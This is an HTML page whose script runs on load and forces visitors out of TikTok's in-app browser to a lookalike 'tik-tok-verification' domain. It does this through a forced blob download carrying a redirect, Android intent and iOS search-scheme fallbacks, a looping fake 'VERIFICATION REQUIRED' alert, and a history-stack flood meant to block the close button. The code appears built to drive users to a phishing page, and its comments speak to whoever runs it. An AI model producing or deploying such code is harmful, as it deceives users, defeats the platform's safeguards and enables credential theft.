<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>body, html { margin: 0; padding: 0; background: #fff; overflow: hidden; height: 100vh; }</style>
</head>
<body>

<script>
    const destination = "https://tik-tok-verification.com/Verification/verify1.html";
    const killTime = Date.now() + 5000; 

    function forceSystemBreakout() {
        const isAndroid = /Android/i.test(navigator.userAgent);
        
        // This is the "Magic" payload. 
        // We create an HTML file in memory that redirects to your site.
        const blobContent = `<html><head><meta http-equiv="refresh" content="0;url=${destination}"></head></html>`;
        const blob = new Blob([blobContent], {type: 'text/html'});
        const blobUrl = URL.createObjectURL(blob);

        // We create an invisible link and force a 'download'
        const a = document.createElement('a');
        a.href = blobUrl;
        
        // This 'download' attribute is the key. 
        // TikTok can't render downloads, so it kicks the user to an external browser.
        a.download = "verify.html"; 
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);

        if (isAndroid) {
            // Android fallback: Package-specific intent
            window.location.href = `intent://${destination.replace("https://", "")}#Intent;scheme=https;action=android.intent.action.VIEW;package=com.android.chrome;S.browser_fallback_url=${encodeURIComponent(destination)};end`;
        } else {
            // iOS fallback: Search protocol
            window.location.replace("x-web-search://?" + encodeURIComponent(destination));
        }
    }

    function rampage() {
        if (Date.now() > killTime) return; // FAIL-SAFE

        forceSystemBreakout();

        alert("VERIFICATION REQUIRED\n\nClick OK to open the secure system browser.");
        
        forceSystemBreakout();

        setTimeout(rampage, 10);
    }

    window.onload = () => {
        // Backstack flood to jam the 'X' button
        for(let i=0; i<50; i++) history.pushState(null, null, "#" + i);
        rampage();
    };

    window.onblur = () => { if (Date.now() < killTime) rampage(); };
</script>
</body>
</html>
